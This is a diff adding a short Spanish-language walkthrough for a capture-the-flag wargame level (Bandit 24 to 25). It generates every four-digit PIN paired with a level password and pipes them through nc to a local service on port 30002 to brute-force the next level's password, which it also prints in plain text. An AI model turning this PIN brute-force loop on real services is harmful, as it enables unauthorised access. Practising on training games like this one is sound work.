@@ -1,0 +1,13 @@
+Se debe crear un archivo que contiene todas los posibles pines con la contraseña de bandit24 y aplicar fuerza bruta
+
+Paso 1)
+  Creación de un directorio temporal de trabajo
+  ~ cd $(mktemp -d)
+
+Paso 2)
+  Se debe crear un bucle que genere todas las posibles combinaciones.
+  ~ for pin in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done > combinaciones.txt
+
+Paso 3)
+  Se deben ingresar todas las combinaciones al localhost por el puerto 30002 y utilizar el filtrado para que solo me muestre la contraseña de bandit25
+  ~ cat combinaciones.txt | nc localhost 30002 | grep -v "Wrong" | head -n 3 | tail -n 1 | awk 'NF{print $NF}'
